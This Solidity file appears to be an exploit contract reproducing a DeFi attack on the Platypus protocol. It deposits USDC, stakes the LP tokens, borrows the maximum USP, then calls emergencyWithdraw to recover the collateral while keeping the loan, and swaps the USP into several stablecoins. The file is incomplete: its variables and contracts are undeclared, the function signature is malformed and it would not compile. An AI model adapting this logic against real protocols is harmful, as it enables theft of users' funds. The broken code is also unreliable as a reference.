// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

contract Exploiter {


    function hello() {
        USDC.approve(address(aaveV3), amount + premium);
        USDC.approve(address(Pool), amount);
        Pool.deposit(address(USDC), amount, address(this), block.timestamp); // deposit USDC to LP-USDC
        uint256 LPUSDCAmount = LPUSDC.balanceOf(address(this));
        LPUSDC.approve(address(Master), LPUSDCAmount);
        Master.deposit(4, LPUSDCAmount); // deposit LP-USDC to MasterPlatypus
        PlatypusTreasure.PositionView memory Position = Treasure.positionView(address(this), address(LPUSDC));
        uint256 borrowAmount = Position.borrowLimitUSP;
        Treasure.borrow(address(LPUSDC), borrowAmount); // borrow USP from Treasure
        Master.emergencyWithdraw(4);
        LPUSDC.approve(address(Pool), LPUSDC.balanceOf(address(this)));
        Pool.withdraw(address(USDC), LPUSDC.balanceOf(address(this)), 0, address(this), block.timestamp); // withdraw USDC from LP-USDC
        swapUSPToOtherToken();
        return true;
    }

    function swapUSPToOtherToken() internal {
        USP.approve(address(Pool), 9_000_000 * 1e18);
        Pool.swap(address(USP), address(USDC), 2_500_000 * 1e18, 0, address(this), block.timestamp);
        Pool.swap(address(USP), address(USDC_E), 2_000_000 * 1e18, 0, address(this), block.timestamp);
        Pool.swap(address(USP), address(USDT), 1_600_000 * 1e18, 0, address(this), block.timestamp);
        Pool.swap(address(USP), address(USDT_E), 1_250_000 * 1e18, 0, address(this), block.timestamp);
        Pool.swap(address(USP), address(BUSD), 700_000 * 1e18, 0, address(this), block.timestamp);
        Pool.swap(address(USP), address(DAI_E), 700_000 * 1e18, 0, address(this), block.timestamp);
    }
}